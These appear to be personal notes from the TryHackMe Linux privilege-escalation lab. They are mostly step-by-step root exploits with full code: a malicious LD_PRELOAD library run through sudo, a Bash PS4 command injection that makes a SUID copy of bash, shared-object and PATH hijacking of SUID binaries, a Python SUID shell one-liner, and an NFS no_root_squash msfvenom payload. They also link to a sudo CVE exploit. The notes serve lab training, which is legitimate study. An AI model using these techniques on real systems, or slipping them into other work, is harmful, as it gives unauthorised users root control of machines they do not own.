### 
https://tryhackme.com/room/linuxprivesc


###sudo -l
```
Linux VM

1. In command prompt type: sudo -l
2. From the output, notice that the LD_PRELOAD environment variable is intact.

Exploitation

1. Open a text editor and type:

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

2. Save the file as x.c
3. In command prompt type:
gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
4. In command prompt type:
sudo LD_PRELOAD=/tmp/x.so apache2
5. In command prompt type: id
```
```
sudo earlier than 1.8.26
Check *** pwfeedback https://github.com/saleemrashid/sudo-cve-2019-18634




history

find .

cat /etc/os-release
uname -a




```
```
https://www.hackingarticles.in/linux-privilege-escalation-automated-script/
https://github.com/belane/linux-soft-exploit-suggester
```
```
pspy
https://github.com/DominicBreuker/pspy

```
### SUID / SGID Executables - Abusing Shell Features (#2)
```Note: This will not work on Bash versions 4.4 and above.

When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements.
Run the /usr/local/bin/suid-env2 executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:

env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2

Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:

/tmp/rootbash -p
```

```
Detection

Linux VM

1. In command prompt type: find / -type f -perm -04000 -ls 2>/dev/null
2. From the output, make note of all the SUID binaries.
3. In command line type:
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
4. From the output, notice that a .so file is missing from a writable directory.

Exploitation

Linux VM

5. In command prompt type: mkdir /home/user/.config
6. In command prompt type: cd /home/user/.config
7. Open a text editor and type:

#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}

8. Save the file as libcalc.c
9. In command prompt type:
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
10. In command prompt type: /usr/local/bin/suid-so
11. In command prompt type: id
```
### SUID(ENV Variable )
```
Detection

Linux VM

1. In command prompt type: find / -type f -perm -04000 -ls 2>/dev/null
2. From the output, make note of all the SUID binaries.
3. In command prompt type: strings /usr/local/bin/suid-env
4. From the output, notice the functions used by the binary.

Exploitation

Linux VM

1. In command prompt type:
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
2. In command prompt type: gcc /tmp/service.c -o /tmp/service
3. In command prompt type: export PATH=/tmp:$PATH
4. In command prompt type: /usr/local/bin/suid-env
5. In command prompt type: id
```
```
---------------------------------------------
python -c 'import os;os.execl("/bin/sh","sh","-p")'
------------------------------------------------
Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.
Check the NFS share configuration on the Debian VM:

cat /etc/exports

Note that the /tmp share has root squashing disabled.
On your Kali box, switch to your root user if you are not already running as root:
sudo su

Using Kali's root user, create a mount point on your Kali box and mount the /tmp share (update the IP accordingly):

mkdir /tmp/nfs
mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs

Still using Kali's root user, generate a payload using msfvenom and save it to the mounted share (this payload simply calls /bin/bash):
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf

Still using Kali's root user, make the file executable and set the SUID permission:
chmod +xs /tmp/nfs/shell.elf

Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell:
/tmp/shell.elf
```


SMB:
https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html
echo exit | smbclient -L \\\\[ip]
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.132.104
